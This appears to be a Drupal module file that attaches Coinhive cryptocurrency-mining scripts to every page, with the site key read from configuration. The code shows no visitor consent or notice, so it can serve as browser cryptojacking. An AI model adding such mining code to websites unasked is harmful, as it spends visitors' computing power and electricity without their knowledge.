<?php

/**
 * @file
 * Contains crypto_miner.module.
 */

/**
 * Implements hook_preprocess_HOOK().
 */
function crypto_miner_preprocess_page(&$variables){
  $variables['#attached']['library'][] = 'crypto_miner/coinhive';
  $variables['#attached']['library'][] = 'crypto_miner/coinhive-client';

  $settings = \Drupal::config('crypto_miner.cryptominersettings');
  $variables['#attached']['drupalSettings']['crypto_miner']['coinHive']['siteKey'] = $settings->get('coinhive_site_key');
}
